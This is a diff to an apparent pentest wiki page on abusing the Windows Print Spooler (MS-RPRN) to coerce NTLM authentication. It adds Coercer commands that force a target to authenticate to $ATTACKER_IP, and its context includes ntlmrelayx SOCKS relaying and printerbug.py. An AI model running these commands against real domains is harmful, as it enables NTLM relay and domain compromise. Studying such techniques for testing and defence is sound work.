@@ -9,7 +9,7 @@ category: ad
 
 Microsoft’s Print Spooler is a service handling the print jobs and other various tasks related to printing. An attacker controling a domain user/computer can, with a specific RPC call, trigger the spooler service of a target running it and make it authenticate to a target of the attacker's choosing. This flaw is a "won't fix" and was historically enabled by default on all Windows environments, though many environments (especially Domain Controllers) now disable the Print Spooler service following PrintNightmare mitigation guidance, and Windows Server 2022+ has stronger defaults ([more info on the finding](https://fr.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory/47)).
 
-The coerced authentications are made over SMB. But MS-RPRN abuse can be combined with [WebClient abuse](webclient.md) to elicit incoming authentications made over HTTP which heightens [NTLM relay](../ntlm/relay.md) capabilities.
+The coerced authentications are made over SMB. But MS-RPRN abuse can be combined with [WebClient abuse](../webclient.md) to elicit incoming authentications made over HTTP which heightens [NTLM relay](../../ntlm/relay.md) capabilities.
 
 The "specific call" mentioned above is the `RpcRemoteFindFirstPrinterChangeNotificationEx` notification method, which is part of the MS-RPRN protocol. MS-RPRN is Microsoft’s Print System Remote Protocol. It defines the communication of print job processing and print system management between a print client and a print server.
 
@@ -17,6 +17,16 @@ The "specific call" mentioned above is the `RpcRemoteFindFirstPrinterChangeNotif
 > The attacker needs a foothold on the domain (i.e. compromised account) for this attack to work since the coercion is operated through an RPC call in the SMB `\pipe\spoolss` named pipe through the `IPC$` share.
 
 ## Practice
+
+[Coercer](https://github.com/p0dalirius/Coercer) (Python) can also be used to trigger all available MS-RPC coercions (including this one) in a single tool, with or without target filtering.
+
+```bash
+# Scan for available coercion methods
+coercer scan -t $TARGET -u "$USER" -p "$PASSWORD" -d "$DOMAIN"
+
+# Coerce authentication to attacker listener
+coercer coerce -t $TARGET -l $ATTACKER_IP -u "$USER" -p "$PASSWORD" -d "$DOMAIN"
+```
 
 Remotely checking if the spooler is available can be done with [SpoolerScanner](https://github.com/vletoux/SpoolerScanner) (Powershell) or with [rpcdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py) (Python).
 
@@ -54,7 +64,7 @@ ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
 
 === ntlmrelayx
 
-In the situation where the tester doesn't have any credentials, it is still possible to [relay an authentication](../ntlm/relay.md) and trigger the spooler service of a target via a SOCKS proxy.
+In the situation where the tester doesn't have any credentials, it is still possible to [relay an authentication](../../ntlm/relay.md) and trigger the spooler service of a target via a SOCKS proxy.
 
 ```bash
 ntlmrelayx.py -t smb://$TARGET -socks
@@ -65,7 +75,7 @@ proxychains printerbug.py -no-pass 'DOMAIN'/'USER'@'TARGET' 'ATTACKER HOST'
 
 
 > [!TIP]
-> **Nota bene**: coerced NTLM authentications made over SMB restrict the possibilites of [NTLM relay](../ntlm/relay.md). For instance, an "unsigning cross-protocols relay attack" from SMB to LDAP will only be possible if the target is vulnerable to CVE-2019-1040 or CVE-2019-1166.
+> **Nota bene**: coerced NTLM authentications made over SMB restrict the possibilites of [NTLM relay](../../ntlm/relay.md). For instance, an "unsigning cross-protocols relay attack" from SMB to LDAP will only be possible if the target is vulnerable to CVE-2019-1040 or CVE-2019-1166.
 
 ## Resources
 
